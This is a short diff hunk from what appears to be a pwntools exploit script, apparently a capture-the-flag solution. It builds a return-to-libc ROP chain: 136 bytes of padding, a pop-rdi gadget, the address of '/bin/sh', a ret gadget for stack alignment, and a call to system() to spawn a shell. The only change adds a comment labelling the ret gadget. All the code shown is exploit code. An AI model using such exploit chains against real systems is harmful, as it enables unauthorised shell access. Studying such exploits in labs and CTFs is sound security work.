@@ -46,7 +46,7 @@ log.success(f"system @ {hex(system)}")
 payload = b"A"*136
 payload += p64(pop_rdi)
 payload += p64(binsh)
-payload += p64(pop_rdi+1)
+payload += p64(pop_rdi+1) # ret gadget
 payload += p64(system)
 
 # Send and trigger payload
